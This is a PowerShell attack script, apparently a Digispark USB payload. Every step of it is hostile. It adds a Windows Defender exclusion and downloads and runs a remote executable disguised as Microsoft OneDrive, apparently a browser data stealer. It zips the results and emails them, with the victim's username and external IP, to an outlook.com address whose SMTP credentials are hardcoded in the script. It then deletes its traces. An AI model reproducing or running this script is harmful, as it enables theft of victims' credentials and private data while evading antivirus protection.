# Adding Windows Defender exclusion path
Add-MpPreference -ExclusionPath $env:APPDATA

# Creating the directory we will work on
$dumpPath = Join-Path $env:APPDATA "dump"
mkdir $dumpPath
Set-Location $dumpPath

# Downloading and executing Microsoft OneDrive.exe
$hackbrowserUrl = "https://github.com/Bxy777/digispark/raw/main/Microsoft%20OneDrive.exe"
Invoke-WebRequest -Uri $hackbrowserUrl -OutFile (Join-Path $dumpPath "Microsoft OneDrive.exe")
Start-Process (Join-Path $dumpPath "Microsoft OneDrive.exe") -Wait
Start-Sleep -Seconds 10
Remove-Item -Path (Join-Path $dumpPath "Microsoft OneDrive.exe") -Force

# Creating a Zip Archive
Compress-Archive -Path * -DestinationPath (Join-Path $dumpPath "dump.zip")

# Mailing the output (you will need to enable less secure app access on your Outlook account for this to work)
$smtpServer = "smtp.office365.com"
$smtpFrom = "bxy63@outlook.com"
$smtpTo = "bxy63@outlook.com"
$username = "bxy63@outlook.com"
$password = "bxypass63"
$ip = Invoke-RestMethod "myexternalip.com/raw"

$subject = "Successfully PWNED $env:USERNAME! ($ip)"
$computerInfo = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model, Manufacturer
$body = "Model: $($computerInfo.Model)`nManufacturer: $($computerInfo.Manufacturer)"

$mailMessage = New-Object System.Net.Mail.MailMessage 
$mailMessage.From = ($smtpFrom)
$mailMessage.To.Add($smtpTo)
$mailMessage.Subject = $subject
$mailMessage.Body = $body

$attachmentPath = Join-Path $dumpPath "dump.zip"
$attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
$mailMessage.Attachments.Add($attachment)

$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
$smtp.EnableSsl = $true
$smtp.Send($mailMessage)

# Cleanup
Start-Sleep -Seconds 10
cd $env:APPDATA
Remove-Item -Path $dumpPath -Force -Recurse
Remove-MpPreference -ExclusionPath $env:APPDATA
